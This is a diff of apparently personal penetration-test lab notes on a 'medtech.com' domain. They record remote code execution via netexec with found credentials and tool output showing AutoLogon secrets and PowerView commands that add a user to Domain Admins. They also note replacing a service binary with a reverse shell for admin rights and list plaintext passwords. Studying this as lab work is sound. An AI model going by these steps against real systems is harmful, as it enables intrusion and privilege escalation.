@@ -218,3 +218,37 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 
 ```
 RCE on: CLIENT01, DEV04 with `yoshi:Mushroom!`
+
+
+
+```
+ =================================================================================================
+
+   User Id         :        S-1-5-21-976142013-3766213998-138799841-1110
+   Event Id        :        4104
+   Context         :        .EXAMPLE
+Adds harmj0y to 'Domain Admins' in the current domain.
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y'
+ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
+Adds harmj0y to 'Domain Admins' in the current domain using the alternate credentials.
+   Created At      :        6/7/2024 3:20:16 AM
+   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+
+   =================================================================================================
+
+
+
+???????????? Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  medtech.com
+    DefaultUserName               :  leon
+
+```
+
+Replaced `C:\TEMP\backup.exe` with a reverse shell, and got Admin privileges
+```
+username: leon
+Password: rabbit:)
+```
